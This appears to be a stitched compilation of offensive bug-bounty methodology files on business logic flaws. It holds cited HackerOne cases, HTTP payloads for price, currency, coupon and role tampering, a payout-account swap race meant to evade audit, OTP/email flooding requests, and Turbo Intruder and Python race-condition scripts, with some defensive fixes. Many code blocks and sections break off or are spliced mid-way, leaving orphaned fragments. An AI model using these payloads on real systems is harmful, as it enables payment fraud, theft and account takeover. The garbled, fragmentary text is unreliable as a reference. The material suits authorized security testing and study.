A payment flow passed order amount and currency through client-controlled parameters before redirecting to a third-party payment provider (Smart2Pay). By intercepting the redirect with Burp Suite and modifying the amount field, an attacker could complete a real payment for $0.01 while the application's webhook — lacking HMAC validation — accepted the provider's confirmation and credited the full item/service to the account. Impact: critical financial loss; attacker receives full value goods/services for near-zero cost, infinitely repeatable.

**Scenario 3 — Email Verification Bypass for Unauthorized Monitoring (Mozilla-style)**
A breach-monitoring service required email verification before enabling monitoring alerts for an address. The verification check was enforced in the UI flow but the underlying API accepted monitoring setup requests for any address using a valid session — skipping the verification step entirely. An attacker could set up monitoring for email addresses they don't own, receiving breach notification data (potentially including credential exposure status) for victim accounts. Impact: privacy violation; attacker gains intelligence on whether a target's email was in a breach without the target's knowledge or consent.

---

## Disclosed Report Citations (Backfill +5 — 2016-2023)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. All five share a measurable financial-impact angle (actual $ loss demonstrated or quantifiable platform-wide exposure).

8. **Stripe — Fee discount race redemption** ([H1 #1849626](https://hackerone.com/reports/1849626))
    - Subclass: coupon/discount race-multi-redemption + financial primitive
    - Payload: Stripe Support applied a one-time $20,000 fee-credit. Researcher captured the "accept-discount" POST and replayed it 30× in parallel via Burp Turbo Intruder, each acceptance crediting the account anew
    - Root cause: idempotency missing on discount-acceptance endpoint; no unique constraint on (account_id, discount_id)
    - Year: 2023 — **$5,000**, $600,000 of fee-free transactions accrued before fix (~$18,000 real Stripe loss at 3% take rate)

9. **Reverb.com — Gift-card race multi-redemption** ([H1 #759247](https://hackerone.com/reports/759247))
    - Subclass: gift-card / store-credit race-redemption
    - Payload: single valid gift card, parallel-POST to `/redeem` from 10 sockets via Turbo Intruder. Balance credits N× the face value
    - Root cause: no row-level lock on gift_card table; balance debit and credit live in separate transactions
    - Year: 2019 — **$1,500**

10. **Upserve / OLO — Negative-quantity price manipulation** ([H1 #364843](https://hackerone.com/reports/364843))
    - Subclass: negative-quantity-in-cart price tampering
    - Payload: `POST /api/order {"items":[{"id":1,"qty":1,"price":50},{"id":2,"qty":-3,"price":50}]}` — order total computes to `-$100`, floors to ~$0 at payment capture, food still fulfills
    - Root cause: server multiplies `qty * price` with no `qty >= 1` guard
    - Year: 2018 — textbook citation for the subclass (acknowledged-only program)

11. **Krisp — Pay-less-per-seat via PUT tampering** ([H1 #1446090](https://hackerone.com/reports/1446090))
    - Subclass: price-per-unit mass-assignment / quantity-discount manipulation
    - Payload: `PUT /v2/seats` body includes a server-trusted `price` field. Set `price=1` instead of $60. Subscription updates, billing engine charges $1/seat for 100 seats
    - Root cause: server reads price from request body instead of looking it up by plan_id; classic mass-assignment
    - Year: 2021 — Stripe-billed SaaS pricing exposure

12. **Stripe — Pay using archived price via mid-flow swap** ([H1 #1328278](https://hackerone.com/reports/1328278))
    - Subclass: cart-state TOCTOU / cancel-then-deliver (price-version race at checkout)
    - Payload: merchant archives an old price (e.g., $5 instead of new $50). Buyer starts checkout via the new payment-link, then mid-flow swaps `price_id` back to the archived one. Stripe charges $5; subscription provisions at the new tier
    - Root cause: payment-link validates "is active", price object validates "exists" — but the join "price.active AND price ∈ link.allowed_prices" is missing
    - Year: 2021 — Stripe Medium (per-subscription recurring loss)

---

## Related Skills & Chains

- **`hunt-race-condition`** — Every uniqueness/quota check in a logic flow is a race candidate. Chain primitive: Business logic (coupon/credit/promotion) + race condition → coupon redeemed N times in a single TCP packet via Turbo Intruder.
- **`hunt-idor`** — Logic flows that trust a client-supplied identifier (order_id, tenant_id, beneficiary_id) overlap directly with IDOR. Chain primitive: business-logic step-skip + IDOR on beneficiary_id → transfer funds from victim account.
- **`hunt-api-misconfig`** — Step-skip and verification-bypass often live next to mass-assignment fields. Chain primitive: business-logic email-verify skip + API mass assignment (`verified:true, role:admin`) → ATO without email control.
- **`hunt-ato`** — Logic bugs in password reset, email change, and recovery flows are core ATO paths. Chain primitive: business logic (email change accepts without re-auth) + `hunt-ato` Path 2 → silent victim email swap → password reset to attacker mailbox.
- **`security-arsenal`** — Load the Business-Logic Probe Checklist (negative quantity, decimal overflow, currency swap, step-skip via direct URL nav, state-machine reverse) and the Always-Rejected list to avoid filing self-inflicted bugs.
- **`triage-validation`** — Apply the 7-Question Gate (especially Q4 "Is this exploitable by an outside attacker without unrealistic preconditions?"): logic bugs need a concrete dollar/PII/state impact, not just "the flow looks weird".


### From `normal-skills/business-logic-flaws.md`

name: business-logic-flaws
description: Comprehensive business logic vulnerability testing methodology covering workflow bypass, race conditions, price/value manipulation, feature abuse, state machine violations, authorization boundary flaws, and domain-specific logic exploitation with optimized detection techniques and payload strategies.
version: 1.0.0
---

## Overview

Business Logic Flaws (BLFs) are vulnerabilities that arise from the inherent design and implementation of application workflows, rather than from traditional technical flaws like injection or misconfiguration. These vulnerabilities exploit the legitimate functionality of an application in unintended ways, bypassing security controls that exist at the code level but fail at the workflow level. Because they operate within expected parameters and protocols, they often evade automated scanners, WAFs, and signature-based detection entirely.

**Key Characteristics:**
- **Context-Dependent:** Exploitation requires deep understanding of the application's domain, workflow, and intended use cases.
- **State-Aware:** Often involve manipulating the state of an application entity (cart, transaction, user account) through unexpected transitions.
- **Legitimate Traffic:** Requests appear syntactically valid and semantically plausible, making detection extremely difficult.
- **High Impact:** Frequently lead to direct financial loss, unauthorized access to premium features, or complete workflow compromise.

**Testing Philosophy:**
> "Think like the developer, then think like an adversary. Understand what the application *should* do, then determine what it *can* be forced to do."

---

### 1.1 Application Flow Decomposition
Before testing, map every workflow as a state machine. Identify transitions, guards, and side effects.

**Methodology:**
1. **Identify All Workflows:** Authentication, registration, checkout, password reset, account deletion, privilege escalation, content creation, moderation, approval chains.
2. **Enumerate States:** For each workflow, list every discrete state (e.g., `CREATED`, `PENDING_VERIFICATION`, `ACTIVE`, `SUSPENDED`, `DELETED`).
3. **Map Transitions:** Document every valid state transition and the HTTP requests that trigger them.
4. **Identify Guards:** Determine what validations, checks, or prerequisites exist at each transition (client-side vs. server-side).
5. **Track Side Effects:** Note every database write, external API call, email/SMS trigger, or financial transaction tied to each state.

**Tools & Techniques:**
- Use Burp Suite's **Target > Site Map** to visualize request flows.
- Browser DevTools **Network** tab with "Preserve log" to trace multi-step processes.
- State machine diagrams (draw.io, PlantUML) to model discovered flows.
- Mind mapping for complex approval chains or multi-actor workflows.

### 1.2 Business Rule Extraction
Extract implicit and explicit business rules from the application.

**Sources of Rules:**
- **Terms of Service / FAQ:** Limits on usage, restrictions, intended behavior.
- **Error Messages:** Reveal validation boundaries (e.g., "Maximum 5 items per order").
- **Client-Side Validation:** HTML `max`, `min`, `pattern`, JavaScript checks (copy to test server-side enforcement).
- **API Documentation:** Swagger/OpenAPI specs, GraphQL schemas.
- **Pricing Pages:** Tier limitations, feature gates, usage quotas.

**Documentation Template:**
```
Workflow: [Name]
States: [List]
Entry Point: [URL/Endpoint]
Transitions:
  - [State A] -> [State B]: [HTTP Method] [Endpoint] [Parameters]
  - Guard: [Validation logic]
  - Side Effect: [Database/API/Financial impact]
Business Rules:
  - Rule 1: [Description] -> Test: [How to violate]
  - Rule 2: [Description] -> Test: [How to violate]
```

### 1.3 Actor & Permission Boundary Analysis
Identify all user roles and cross-role interaction points.

**Role Enumeration:**
- Anonymous, Authenticated, Premium, Admin, Moderator, API Client, Webhook Consumer, Partner, Support Agent.
- **Ghost Roles:** Legacy roles no longer assignable but still valid in code (e.g., `super_admin`, `beta_tester`).
- **Composite Roles:** Users with multiple simultaneous roles or context-dependent permissions.

**Cross-Role Testing Matrix:**
Create a matrix testing every action against every role. Mark expected vs. actual outcomes.

---

### 2.1 Step Skipping & State Violation

**Concept:** Multi-step workflows (checkout, registration, KYC, approval) often assume sequential execution. If server-side state validation is missing or weak, steps can be skipped, reordered, or repeated.

**Detection Techniques:**

**A. Direct Endpoint Access**
Skip intermediate steps by calling the final step endpoint directly.
```
Step 1: GET /checkout/shipping
Step 2: POST /checkout/payment (normally requires shipping_id)
Step 3: POST /checkout/confirm

Bypass: Directly POST to /checkout/confirm with only payment details,
        omitting shipping_id or using a hardcoded/null value.
```

**B. Parameter Tampering**
Modify state-tracking parameters to jump states.
```
Original: step=3&status=payment_complete
Modified: step=5&status=order_confirmed
```

**C. Session/Token Manipulation**
Reuse or forge tokens that represent completed steps.
```
Workflow uses: setup_token=abc123&verify_token=def456
Test: Use verify_token from a different account/session.
Test: Brute-force short tokens or predict sequential tokens.
Test: Set verify_token to null, empty string, or "true".
```

**D. Missing Negative Testing**
Test what happens when required step data is:
- Omitted entirely
- Set to `null`, `undefined`, `0`, `false`, `""`
- Replaced with data from a different workflow instance
- Submitted in reverse order

**Payloads & Patterns:**
```http

# Skip verification
POST /api/account/activate
{"user_id": 1234, "verification_code": "0000", "skip_verification": true}

# Force state transition
POST /api/order/status
{"order_id": "ORD-123", "status": "shipped", "force": true}

# Reuse old token
POST /api/checkout/complete
{"checkout_token": "<TOKEN_FROM_OLD_COMPLETED_ORDER>"}
```

### 2.2 Replay Attacks

**Concept:** Legitimate requests or tokens are captured and replayed to duplicate their effect.

**A. Transaction Replay**
Duplicate financial or state-changing requests.
```http

# Capture successful purchase request
POST /api/payment/charge
{"amount": 100.00, "token": "tok_visa_xxx", "order_id": "ORD-1"}

# Expected: Order ORD-1 charged twice OR new order created with same payment
```

**B. Token Replay**
Reuse single-use tokens (password reset, email verification, coupon codes).
```http

# Password reset token
GET /reset-password?token=abc123&email=victim@example.com

# Replay after use: Should be invalidated but often isn't
```

**C. Idempotency Key Bypass**
APIs using `Idempotency-Key` headers for replay protection.
```http

# Test 1: Reuse same key with different payload
Idempotency-Key: key-123
{"amount": 100}

Idempotency-Key: key-123
{"amount": 1000}  # Should reject, but may process if only key is checked

# Test 4: Key truncation: Very long keys that DB truncates
```

**D. Race Condition Replay**
See Phase 3 for advanced replay via concurrency.

### 2.3 Workflow Hijacking

**A. Cross-User Workflow Takeover**
Workflow identifiers are predictable or insufficiently bound to sessions.
```
Attacker starts workflow: workflow_id=12345
Victim starts workflow: workflow_id=12346
Attacker modifies workflow_id to 12346 and submits final step,
completing victim's workflow with attacker-controlled data.
```

**B. Workflow Instance Confusion**
Applications maintaining multiple workflow types with overlapping ID spaces.
```
Cart workflow ID: cart_12345
Checkout workflow ID: checkout_12345
Test: Use cart ID in checkout endpoint or vice versa.
```

---

### 3.1 Time-of-Check to Time-of-Use (TOCTOU)

**Concept:** The application checks a condition, then acts on it, but the state changes between check and action.

**A. Coupon/Discount Reuse**
Single-use coupon applied multiple times via parallel requests.
```bash

# Create multiple concurrent requests
for i in {1..10}; do
  curl -X POST https://target.com/api/cart/apply-coupon \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code":"SINGLE-USE-50"}' &
done
wait
```

**B. Balance/Quota Manipulation**
Account balance checked before deduction, allowing overdraft or overuse.
```http

# Concurrent purchase of two $10 items
POST /api/purchase {"item": "premium", "price": 10}  # x10 parallel

# Vulnerable: All succeed, balance goes negative
```

**C. Limit Bypass**
Rate limits or usage caps checked per-request but not atomically.
```http

# Vulnerable: Counter increments after processing, allowing burst
```

**D. Inventory/Stock Manipulation**
Purchase quantity checked against stock, then decremented.
```http

### 3.2 Limit Bypass via Race Conditions

**A. Voucher Code Exhaustion**
Limited-quantity voucher redeemed by multiple users simultaneously.
```bash

# Vulnerable: 2-5 successes due to non-atomic decrement
```

**B. Referral Bonus Farming**
One-time referral bonus triggered multiple times.
```http

# Check if referrer gets $10 x 10 = $100 instead of $10
```

**C. Vote/Like Manipulation**
One vote per user, but parallel requests bypass check.
```bash
curl -X POST /api/post/123/like & \
curl -X POST /api/post/123/like & \
curl -X POST /api/post/123/like
```

### 3.3 Testing Methodology for Race Conditions

**Step 1: Identify Critical Sections**
Look for operations involving:
- Financial transactions
- Inventory/stock checks
- Usage quota decrements
- Unique constraint enforcement (emails, usernames, codes)
- State transitions that should be atomic

**Step 2: Determine Timing Window**
Measure request processing time. The vulnerability window is between check and use.
```bash

# If response time > 50ms, race condition is plausible
```

**Step 3: Construct Parallel Requests**
Use multiple techniques to maximize collision probability:

**Turbo Intruder (Burp Suite):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for i in range(50):
        engine.queue(target.req, target.baseInput, gate='race1')
    
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Python Threading:**
```python
import threading, requests

url = "https://target.com/api/redeem"
data = {"code": "SINGLE-USE"}
headers = {"Authorization": "Bearer TOKEN"}

def redeem():
    requests.post(url, json=data, headers=headers)

threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

**Step 4: Validate Results**
- Check server-side state, not just response codes.
- A 200 OK on all requests with actual state change indicates vulnerability.
- A mix of 200 and 409/422 may still indicate partial success.

**Step 5: Adjust Timing**
If not successful:
- Increase concurrent connections (100-1000).
- Use HTTP/2 single-connection multiplexing (higher collision probability).
- Target high-latency endpoints to widen the window.
- Add artificial delay between check and use (if controllable).

---

### 4.1 Integer Overflow & Underflow

**Concept:** Numeric boundaries are not validated, causing wrap-around behavior.

**A. Negative Quantities**
```http
POST /api/cart/add
{"product_id": 123, "quantity": -5}

# Vulnerable: Cart total decreases by 5x item price, or refund issued
```

**B. Integer Overflow**
```http
POST /api/cart/add
{"product_id": 123, "quantity": 2147483648}  # 2^31

# Cart total: price * (-2147483648) = massive negative
```

**C. Quantity Precision**
```http
POST /api/cart/add
{"product_id": 123, "quantity": 0.001}

### 4.2 Floating-Point Arithmetic Errors

**Concept:** IEEE 754 floating-point representation causes precision loss in financial calculations.

**A. Rounding Error Accumulation**
```http

# Server may accept either, allowing price manipulation
```

**C. Scientific Notation**
```http
POST /api/payment
{"amount": 1e-10}  # May be parsed as 0.0000000001 or 0 depending on parser
```

# Result: Pay EUR amount based on old rate while receiving USD value
```

**B. Currency Confusion**
```http

# Send amount in smallest unit (cents) but wrong currency
{"amount": 100, "currency": "JPY"}  # 100 JPY = $0.67

### 4.4 Price Parameter Tampering

**A. Client-Side Price Submission**
```http
POST /api/checkout
{"items": [{"id": 123, "price": 0.01}], "total": 0.01}

# Apply multiple discounts that should be mutually exclusive
POST /api/cart/apply
{"codes": ["WELCOME10", "SUMMER20", "FLASH30"]}

# Or multiplicative: 0.9 * 0.8 * 0.7 = 0.504 (49.6% off)
```

**C. Negative Price via Refund/Credit**
```http
POST /api/refund
{"order_id": "123", "amount": -100}

# Primary parameter is validated, secondary is not
POST /api/checkout
{"items": [{"id": 123, "price": 100}], "metadata": {"actual_price": 0.01}}

# GIFAR attacks (polyglot files)
```

**B. Unbounded API Pagination**
```http
GET /api/users?limit=999999999&offset=0

# Vulnerable: Returns all records, causing DB timeout or memory exhaustion

GET /api/search?q=*&page_size=100000

# Full table scan triggered
```

**C. Recursive/Deep Nesting**
```http
POST /api/comments
{"text": "x", "replies": [{"text": "x", "replies": [{"text": "x", ...}]}]}

# Causes stack overflow in parser or excessive memory use
```

**D. Regular Expression DoS (ReDoS)**
```http
POST /api/validate
{"pattern": "^(a+)+$", "input": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}

### 5.2 Functionality Misuse

**A. Email Verification for Spam**
```http
POST /api/register
{"email": "victim@example.com"}

# Automate to send thousands of emails
```

**B. SMS/OTP Flooding**
```http
POST /api/otp/send
{"phone": "+1234567890"}

# User harassment
```

**C. Notification Abuse**
```http
POST /api/share
{"email": "victim@example.com", "message": "Spam content"}

### 5.3 API Abuse

**A. Mass Assignment**
```http
POST /api/users
{"name": "John", "role": "admin", "is_verified": true, "balance": 10000}

# Vulnerable: All fields writable due to lack of allowlisting
```

**B. GraphQL Query Depth/Nesting**
```graphql
query {
  users {
    friends {
      friends {
        friends {
          friends { name }
        }
      }
    }
  }
}

# Unbounded recursion in GraphQL resolvers
```

**C. Batch Request Abuse**
```http
POST /api/batch
[
  {"method": "GET", "path": "/user/1"},
  {"method": "GET", "path": "/user/2"},
  # ... 10,000 requests
]

# Even if UUIDs are used, check for secondary IDs or predictable patterns
```

**B. Cross-Account Workflow Access**
```http

# Cancel another user's subscription
POST /api/subscription/cancel
{"subscription_id": "sub_victim_123"}

### 6.2 Vertical Privilege Escalation

**A. Role Parameter Tampering**
```http
POST /api/users/upgrade
{"user_id": "self", "role": "admin"}

# Check response for feature flags: {"features": {"admin_panel": false}}
POST /api/feature/enable
{"feature": "admin_panel", "enabled": true}
```

**C. Endpoint Discovery**
```http

# Access admin endpoints as regular user
GET /admin/users
GET /api/v1/internal/audit
GET /debug/console

# Token still valid?
GET /api/account/reactivate?token=<OLD_TOKEN>
```

**C. Circular State Loops**
```http

# Toggle privacy setting repeatedly
POST /api/profile/privacy
{"setting": "public"}  # Triggers notification to followers
POST /api/profile/privacy
{"setting": "private"}  # No notification

# Rapid email changes -> webhook flood to multiple addresses
POST /api/user/email
{"email": "temp1@example.com"}
POST /api/user/email
{"email": "temp2@example.com"}
```

---

# Add heavy items, set shipping to lightweight item's rate
POST /api/cart/shipping
{"item_id": 123, "shipping_class": "digital"}  # For physical item
```

**C. Tax Jurisdiction Shopping**
```http

# Or: Use freight forwarder address for tax-free purchase
```

**D. Gift Card/Credit Loop**
```http

# Or: Use Unicode homoglyphs, zero-width spaces, image-based text
```

**C. Ranking Algorithm Gaming**
```http

### 9.1 Multi-Step Attack Chaining

Chain multiple minor logic flaws into critical vulnerabilities.

**Example Chain:**
```
1. IDOR: View another user's cart (information disclosure)
2. Replay: Reuse their discount code (coupon bypass)
3. Race Condition: Apply code multiple times (limit bypass)
4. Price Tampering: Modify item price in cart (value manipulation)
5. Step Skip: Bypass payment verification (workflow bypass)
= Complete order at $0.00 using victim's discount
```

# Test: RSA key confusion (use public key as HMAC secret)
```

**B. Timestamp Validation**
```http

# Request with malicious parameter poisons cache for all users
GET /api/profile?user_id=123&role=admin

# Force server to cache authenticated content
GET /api/balance.css  # Server returns balance data, cache stores it

### 10.1 Automated Detection Aids

While business logic flaws resist full automation, tools can assist:

**Burp Suite Extensions:**
- **Autorize:** Test horizontal authorization by repeating requests with different session tokens.
- **Flow:** Visualize application workflow and state transitions.
- **Turbo Intruder:** High-speed race condition testing.
- **Param Miner:** Discover hidden parameters that may control business logic.

**Custom Scripts:**
```python

# Automated state transition fuzzer
import requests

states = ['created', 'pending', 'active', 'suspended', 'deleted']
transitions = []

for from_state in states:
    for to_state in states:
        if from_state != to_state:
            r = requests.post('/api/force-transition',
                            json={'from': from_state, 'to': to_state})
            if r.status_code == 200:
                transitions.append((from_state, to_state))
```

### 10.2 Manual Testing Checklist

For each workflow, verify:

- [ ] Can steps be skipped by calling later endpoints directly?
- [ ] Can steps be repeated after completion?
- [ ] Can workflow state be manipulated via parameters?
- [ ] Are tokens/session IDs predictable or reusable?
- [ ] Are numeric boundaries enforced (min, max, precision)?
- [ ] Are negative values handled correctly?
- [ ] Are calculations atomic (no race conditions)?
- [ ] Are prices/values verified server-side?
- [ ] Can multiple discounts/credits be stacked?
- [ ] Are role/permission checks present on every endpoint?
- [ ] Can IDOR be exploited in workflow contexts?
- [ ] Are webhooks/idempotency keys validated?
- [ ] Are time/location/device restrictions enforced server-side?
- [ ] Can features be enabled via parameter tampering?
- [ ] Are mass assignment vulnerabilities present?

### 10.3 Evidence Collection

**Required Artifacts:**
1. **Workflow Diagram:** Visual representation of the vulnerable flow.
2. **Request/Response Pairs:** Full HTTP transcripts of exploitation.
3. **Before/After State:** Screenshots or API responses showing system state change.
4. **Impact Calculation:** Quantified financial, operational, or data impact.
5. **Reproduction Steps:** Step-by-step instructions, including timing for race conditions.
6. **Root Cause Analysis:** Specific code logic or design decision causing the flaw.

---

### 11.1 Design-Level Fixes

**A. Server-Side State Machines**
Implement explicit state machines with defined transitions. Reject any transition not in the allowed set.

```python

# Example: Explicit state machine
class OrderStateMachine:
    transitions = {
        'PENDING': ['PAID', 'CANCELLED'],
        'PAID': ['SHIPPED', 'REFUNDED'],
        'SHIPPED': ['DELIVERED', 'LOST'],
        'DELIVERED': ['RETURNED'],
    }
    
    def transition(self, new_state):
        if new_state not in self.transitions[self.current_state]:
            raise InvalidTransitionError()
```

**B. Atomic Operations**
Use database transactions and atomic operations for all critical checks.
```sql
-- Instead of: SELECT balance; UPDATE balance;
-- Use: UPDATE accounts SET balance = balance - 10 WHERE balance >= 10;
```

**C. Allowlist Validation**
Explicitly define acceptable parameters and reject everything else.
```python
allowed_fields = {'name', 'email', 'phone'}
data = {k: v for k, v in request.json.items() if k in allowed_fields}
```

### 11.2 Implementation-Level Fixes

**A. Idempotency Keys**
Implement proper idempotency with request signature validation.
```python
def process_payment(idempotency_key, payload):
    cache_key = hash(idempotency_key + canonical_json(payload))
    if cache.exists(cache_key):
        return cache.get(cache_key)  # Exact match required
```

**B. Ownership Verification**
Every resource access must verify ownership.
```python
def get_order(order_id, user):
    order = db.orders.find(order_id)
    if order.user_id != user.id and not user.is_admin:
        raise Unauthorized()
    return order
```

**C. Rate Limiting**
Apply rate limits at the business logic level, not just network level.
```python
@limit(key="user_id", max=5, period=3600)
def apply_coupon(code):
    ...
```

---

### Numeric Manipulation
```json
{"quantity": -1}
{"quantity": 0}
{"quantity": 999999999999999}
{"quantity": 1.7976931348623157e+308}
{"quantity": "1"; DROP TABLE--"}
{"quantity": null}
{"quantity": [1, 2, 3]}
{"quantity": {"value": 1}}
```

### State/Status Manipulation
```json
{"status": "admin"}
{"status": true}
{"status": 1}
{"status": "deleted"}
{"status": null}
{"is_verified": true}
{"role": "superuser"}
{"admin": true}
```

### Workflow Manipulation
```json
{"step": 999}
{"step": "final"}
{"completed": true}
{"verified": true}
{"skip_validation": true}
{"force": true}
{"debug": true}
```

### Array/Object Injection
```json
{"codes": ["CODE1", "CODE2", "CODE3"]}
{"items": [{"price": 0.01, "id": 123}]}
{"metadata": {"price": 0.01}}
```

---

### Turbo Intruder: Race Condition Template
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=1,
                          pipeline=False)
    
    for i in range(100):
        engine.queue(target.req, target.baseInput, gate='race1')
    
    engine.openGate('race1')

def handleResponse(req, interesting):
    if req.status != 409:
        table.add(req)
```

### Python: Concurrent Request Script
```python
import asyncio, aiohttp, json

async def race_test(url, payload, count=50):
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(url, json=payload) 
            for _ in range(count)
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        return [r.status if hasattr(r, 'status') else str(r) 
                for r in responses]
```

---

## Appendix C: Quick Reference Card

| Category | Test | Indicator | Impact |
|----------|------|-----------|--------|
| Workflow Bypass | Skip step | 200 OK on final step without prerequisites | Unauthorized completion |
| Workflow Bypass | Replay token | Multiple successes with same token | Duplicate actions |
| Race Condition | Parallel redeem | Multiple 200 OKs | Financial loss, overuse |
| Price Manipulation | Negative qty | Cart total decreases | Refund fraud |
| Price Manipulation | Client price | Server accepts submitted price | Underpayment |
| Feature Abuse | No upload limit | Server accepts >100MB | DoS, storage cost |
| Feature Abuse | SMS flood | No rate limit on OTP | Financial loss, harassment |
| Authorization | IDOR in workflow | Access others' workflows | Data breach, fraud |
| State Machine | Invalid transition | DELIVERED->PENDING works | Inventory/logic chaos |

---


### From `offensive-skills/offensive-business-logic/SKILL.md`

# Business Logic — Offensive Testing Methodology

Business logic flaws are the highest-paying class of vulnerability for bug bounty and the hardest for scanners to detect. They live in the gap between what the developer specified and what an attacker can convince the system to accept.

## Quick Workflow

1. Map every multi-step flow as a state machine (states + allowed transitions + side effects)
2. For each transition, ask: who can call it, in what state, with what inputs, how many times
3. Probe each axis (state, identity, input, frequency) for assumptions
4. Combine flaws — single-axis flaws are usually low severity; chains are critical
5. Quantify financial impact per finding (loss-per-attack × scale)

---

### Build the State Machine

For each user flow, draw:
- **States**: cart, pending payment, paid, shipped, refunded, cancelled
- **Transitions**: which API/UI action, which role, which preconditions
- **Side effects**: balance change, inventory change, email, webhook

Look for transitions that:
- Skip intermediate states (`cart` → `shipped` without `paid`)
- Are reversible when they shouldn't be (`shipped` → `cart`)
- Trigger side effects more than once
- Allow cross-role invocation

# Compare authenticated and unauthenticated JS bundles for buried admin routes
diff <(curl https://app/main.js) <(curl -H "Cookie: ..." https://app/main.js)

# Look for flag/feature toggles that change UI but not server-side enforcement
grep -E '(isAdmin|isInternal|featureFlag|debug)' bundle.js

# API spec (OpenAPI/Swagger) often lists endpoints the UI never calls
curl https://app/api/openapi.json | jq '.paths | keys'
```

---

# Try jumping directly:
GET /dashboard
GET /api/account/details
POST /api/payout-settings
```

```http

# Skip /payment by replaying /confirm with a previous order's payment-token reference:
POST /api/order/confirm
{ "cartId": "current", "paymentRef": "<old-paid-order-payment-ref>" }
```

# Refund endpoint without idempotency
POST /api/orders/123/refund   # First call: $50 refunded, order marked refunded
POST /api/orders/123/refund   # Second call: server checks "is order refunded?" — race the check (see TOCTOU)
```

### State Downgrade

Move a finalized object back to an editable state where mutations have effect:

```http
PUT /api/order/123
{ "status": "draft" }   # If accepted, you can now edit the price field
PUT /api/order/123
{ "items": [{ "id": "tv", "price": 1 }] }
```

### Direct Endpoint Invocation

Many admin/backend transitions are reachable from any authenticated user if route-level RBAC is missing while the UI hides them.

```bash

# Enumerate verbs on every discovered path
for path in $(cat paths.txt); do
  for v in GET POST PUT PATCH DELETE OPTIONS; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X $v -H "Authorization: Bearer $T" https://app$path)
    echo "$v $path $code"
  done
done | grep -v -E ' (401|403|404) '
```

---

### Negative / Zero / Float Quantities

```http
POST /api/cart/add
{ "sku": "tv", "qty": -1 }      # Refund issued for adding negative items?
{ "sku": "tv", "qty": 0.0001 }  # Float rounding: $0 line item, full product shipped?
{ "sku": "tv", "qty": 9e99 }    # Overflow → wraps to small number, $0 cost?
```

### Hidden Price Fields

```http
POST /api/checkout
{ "items": [{"sku":"tv","qty":1,"price":1}], "total": 1, "tax": 0, "shipping": 0 }
```

If the server trusts client-supplied `price`, you set the price. Test every numeric field — `price`, `total`, `discount`, `tax`, `shipping`, `subtotal`, `currency`.

### Currency Confusion

```http
POST /api/checkout
{ "amount": 100, "currency": "JPY" }   # Pay 100 JPY (~$0.65) for $100 USD product?
{ "amount": 100, "currency": "VND" }   # Even better
{ "amount": 100, "currency": "BTC" }   # Or worse: pay in BTC at $1 BTC = $1?
```

Look for: missing currency normalization, sloppy FX rate caching, currency lookup by user input.

# Apply same coupon multiple times
POST /api/cart/coupon { "code": "SAVE50" }
POST /api/cart/coupon { "code": "SAVE50" }   # Stacks?
POST /api/cart/coupon { "code": "save50" }   # Case sensitivity gives second slot?
POST /api/cart/coupon { "code": "SAVE50 " }  # Whitespace ditto?

# Coupon for a different product
POST /api/cart/apply-coupon { "code": "FREEMOUSE", "appliedTo": "macbook" }

# Negative discount (becomes a surcharge that reduces total when coupon stacked with another)
POST /api/admin/coupon { "code": "X", "percent": -50 }   # If admin endpoint reachable

# Expired coupon: change date in payload?
POST /api/cart/coupon { "code": "BLACKFRIDAY", "appliedAt": "2023-11-25T00:00:00Z" }
```

# Add a cheap item, edit the SKU server-side
POST /api/cart/add { "sku": "pen", "qty": 1 }
PUT  /api/cart/items/abc { "sku": "macbook" }      # SKU swap with pen's price retained?
```

---

### Refund After Returning Less

Order ships 5 items, you return 1, request refund for full order. Logic should compute refund per returned item; if it computes per *order*, free items.

### Convert Refund to Different Method

```http
POST /api/orders/123/refund { "method": "store-credit" }

### Payout Account Race

```http
PUT  /api/payout-account { "iban": "ATTACKER" }
POST /api/withdraw { "amount": 1000 }
PUT  /api/payout-account { "iban": "ORIGINAL" }   # Restore before audit
```

---

### Role Confusion via Multipart / Parameter Pollution

```http
POST /api/users/me
role=user&role=admin              # Last-wins parser → admin
{"role": "user", "role": "admin"} # JSON last-wins
```

### Tenant ID Substitution in Hidden Field

```http
POST /api/invoices
{ "amount": 100, "tenantId": "victim-corp", "billTo": "attacker" }

### Mass Assignment / Field Whitelist

```http
PUT /api/users/me
{ "email": "x@y.com", "isAdmin": true, "credits": 10000, "tenantId": "victim" }
```

Test every field that exists on the model, not just those the form exposes.

### Indirect Privilege via Object Linking

```http
POST /api/projects/PUBLIC-PROJECT/share-token   # Anyone can mint
GET  /api/projects/PUBLIC-PROJECT/internal-only-data?token=...

## Race Conditions on Logic Boundaries

Logic checks that read state, then act on state, are TOCTOU-vulnerable. (Also see: `offensive-toctou`, `offensive-race-condition`.)

### Common Logic Races

| Flow | Race |
|------|------|
| Coupon redemption | N parallel `apply-coupon` calls each see "unused" |
| 2FA verification | Submit code N times in parallel before lockout counter increments |
| Withdrawal | Parallel withdraws each see full balance |
| Vote / Like / Reaction | "One per user" check raced |
| Invitation acceptance | Multiple accepts → multiple seats granted |
| Free-trial signup | Parallel signups → multiple trials per email |
| Gift-card redeem | Parallel redeems → multi-spend a single card |
| Inventory reservation | Parallel buys of last item → oversell, supplier covers difference |

### Captcha / Rate Limit Bypass

| Bypass | Mechanic |
|--------|----------|
| Token reuse | One captcha solve, replay token across many requests |
| Endpoint mirror | `/api/v1/login` rate-limited, `/api/v2/login` not |
| Header rotation | `X-Forwarded-For: <random>` resets per-IP counter |
| HTTP/2 stream multiplexing | Each stream counted as same conn → window only |
| Method/case variation | `POST /Login` vs `POST /login` keyed differently in cache |

### Device Fingerprint / Velocity

- New device → require step-up auth. Replay captured device cookies / FingerprintJS hash.
- Velocity counters (5 logins/hour) often per `(userid, ip)` not per `userid`.
- Risk score thresholds: small purchases skip review. Test the boundary ($99.99 vs $100).

# Email aliasing
attacker+1@gmail.com, attacker+2@gmail.com         # Plus-aliasing
